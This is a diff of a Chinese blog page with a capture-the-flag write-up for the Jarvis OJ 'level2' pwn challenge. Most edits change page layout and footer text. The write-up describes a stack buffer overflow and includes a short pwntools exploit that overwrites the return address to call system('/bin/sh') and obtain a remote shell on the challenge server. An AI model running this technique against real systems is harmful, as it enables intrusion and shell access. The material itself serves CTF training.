@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="CTF,Pwn">
-    <meta name="description" content="题目信息 nc pwn2.jarvisoj.com 9878 level2.54931449c557d0551c4fc2a10f4778a1  开了NX和Partial RELRO                                                                                                             静">
+    <meta name="description" content="题目信息 nc pwn2.jarvisoj.com 9878 level2.54931449c557d0551c4fc2a10f4778a1  开了NX和Partial RELRO  静态分析IDA F5，可以看到明显的溢出，但可利用区域有限：   存在system函数及’&#x2F;bin&#x2F;sh’字符串，那么就可以修改返回地址为调用system(‘&#x2F;bin&#x2F;sh’))来getshell  流程大概如图，图">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XMAN level2">
 <meta property="og:url" content="https://darkwing.moe/2019/05/15/XMAN-level2/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="题目信息 nc pwn2.jarvisoj.com 9878 level2.54931449c557d0551c4fc2a10f4778a1  开了NX和Partial RELRO                                                                                                             静">
+<meta property="og:description" content="题目信息 nc pwn2.jarvisoj.com 9878 level2.54931449c557d0551c4fc2a10f4778a1  开了NX和Partial RELRO  静态分析IDA F5，可以看到明显的溢出，但可利用区域有限：   存在system函数及’&#x2F;bin&#x2F;sh’字符串，那么就可以修改返回地址为调用system(‘&#x2F;bin&#x2F;sh’))来getshell  流程大概如图，图">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051508.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051509.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051510.jpg">
@@ -117,8 +117,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -140,7 +147,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -208,59 +215,17 @@
 <p><a href="https://dn.jarvisoj.com/challengefiles/level2.54931449c557d0551c4fc2a10f4778a1" target="_blank" rel="noopener">level2.54931449c557d0551c4fc2a10f4778a1</a></p>
 </blockquote>
 <p>开了NX和Partial RELRO</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051508.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051508.jpg" alt=""></p>
 <h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>IDA F5，可以看到明显的溢出，但可利用区域有限：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051509.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051510.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051509.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051510.jpg" alt=""></p>
 <p>存在system函数及’/bin/sh’字符串，那么就可以修改返回地址为调用system(‘/bin/sh’))来getshell</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051511.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051511.jpg" alt=""></p>
 <p>流程大概如图，图源自网络</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051512.png" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051512.png" alt=""></p>
 <h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><h2 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9878</span>)</span><br><span class="line"><span class="comment"># sh = process('./level2')</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">system_addr = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_sh_addr = elf.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) <span class="comment"># buf + old_ebp</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051513.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051513.jpg" alt=""></p>
 
         </div>
 
@@ -269,7 +234,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-05-15T07:40:37.978Z" itemprop="dateUpdated">2019-05-15 15:40:37</time>
+    Last updated: <time datetime="2019-05-15T07:40:37.978Z" itemprop="dateUpdated">2019-05-15 15:40:37</time>
 </span><br>
 
 
@@ -436,11 +401,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
